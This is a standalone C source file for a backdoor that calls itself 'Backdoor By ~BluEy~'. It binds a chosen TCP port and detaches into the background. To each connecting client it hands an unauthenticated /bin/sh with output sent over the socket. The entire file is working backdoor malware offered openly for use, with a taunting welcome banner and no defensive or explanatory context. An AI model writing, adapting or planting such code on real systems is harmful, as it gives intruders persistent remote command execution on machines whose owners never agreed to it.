#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* ========================================================================= */

#define WELECOME_NOTE "Hi Beeyatch, welecome ta BluEy'z <NEB> UnderGroUnd\n\n"

#define MAXLINE 80
#define BUFSIZE 2000

int debug_level = 0;

/* ========================================================================= */

void usage(char *filename) {
  fprintf(stderr, "\n"
	  "Backdoor By ~BluEy~      ......<<<  http://seeker.ath.cx - N.E.B.\n"
	  "=================================================================\n"
	  "Usage: %s [options] -p port\n\n"
	  
	  "Options:\n"
	  "-h            Help\n"
	  "-d level      Debug on and set to 'level'\n"
	  "-p port       Port to bind to\n\n",
  
	  filename);
}

/* ========================================================================= */

int main(int argc, char **argv) {
  const char *optstring = "hd:p:";

  char o;

  unsigned short int port = 0;

  /* ----------------------------------------------------------------------- */
  /* Get args */

  o = getopt(argc, argv, optstring);

  while (o != -1) {
    switch (o) {

    case 'h':
      usage(argv[0]);
      return 0;

    case 'd':
      debug_level = atoi(optarg);
      fprintf(stderr, "debug_level set to %d\n", debug_level);
      break;

    case 'p':
      port = atoi(optarg);
      break;

    }
    o = getopt(argc, argv, optstring);
  }

  if (!port) {
    usage(argv[0]);
    return -1;
  }
 
  /* ----------------------------------------------------------------------- */

  pid_t pid;
  int clipid, serpid, stat, sock, sockbind, sockopt, sockcli;
  unsigned short int mcon;
  struct sockaddr_in  client, server;

  char buf[BUFSIZE];

  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    fprintf(stderr, "socket failed: %s\n", strerror(errno));
    return -1;
  }
  
  mcon = 5;
 
  memset(&server, 0, sizeof(server));
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = htonl(INADDR_ANY);
  
  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, 
		 (void *) &sockopt, sizeof(sockopt)) < 0) {
    fprintf(stderr, "setsockopt failed: %s\n", strerror(errno));
    return -1;
  }
  
  if ((sockbind = 
      bind(sock, (struct sockaddr *) &server, sizeof(server))) < 0) {
    fprintf(stderr, "bind failed: %s\n", strerror(errno));
    return -1;
  }

  if (debug_level > 50)
    fprintf(stderr, "Binded to host %s, port %d, socket %d\n",
	    inet_ntoa(server.sin_addr), ntohs(server.sin_port), sock);
  
  if ((sockbind = listen(sock, mcon)) < 0) {
    fprintf(stderr, "listen failed: %s\n", strerror(errno));
    return -1;
  }

  umask(0);
  
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  if (!debug_level) {
    close(STDERR_FILENO);
  }

  while (1) {

    socklen_t size = sizeof(struct sockaddr_in);
    if ((sockcli = accept(sock, (struct sockaddr *) &client, &size)) < 0) {
      fprintf(stderr, "listen failed: %s\n", strerror(errno));
      return -1;  /* syslog msg here still */
    }
    
    if ((pid = fork()) < 0) {
      fprintf(stderr, "fork() failed: %s\n", strerror(errno));
      return -1;
    } else if (pid > 0) {
      if (debug_level > 50)
	fprintf(stderr, "pid > 0: no nothing\n");
    } else if ((chdir("/")) < 0) {
      fprintf(stderr, "Could not set working directory");
      return -1;
    } else if ((setsid()) < 0) {
      fprintf(stderr, "setsid() failed in creating daemon");
      return -1;
    } else {
      
      if (debug_level > 10)
	fprintf(stderr, 
		"Accepted comm's from host %s:%d, socket %d\n",
	        inet_ntoa(client.sin_addr), ntohs(client.sin_port), sockcli);
      
      sprintf(buf, WELECOME_NOTE);
      if (write(sockcli, buf, strlen(buf)) < 0) {
	fprintf(stderr, "write() failed: %s\n", strerror(errno));
	return -1;
      }
      
      /* setup shell */
      clipid = getpid();
      serpid = fork();
      if (serpid > 0) waitpid(0, &stat, 0);    
      dup2(sockcli, 1);
      execl("/bin/sh", "sh", (char *) 0);  
      
    }
    
    close(sockcli);
    
    if (debug_level > 50)
      fprintf(stderr, "closed client sock %d\n", sockcli);
    
  }

  close(sock);   

  if (debug_level > 50)
    fprintf(stderr, "closed server sock %d\n", sock);

}
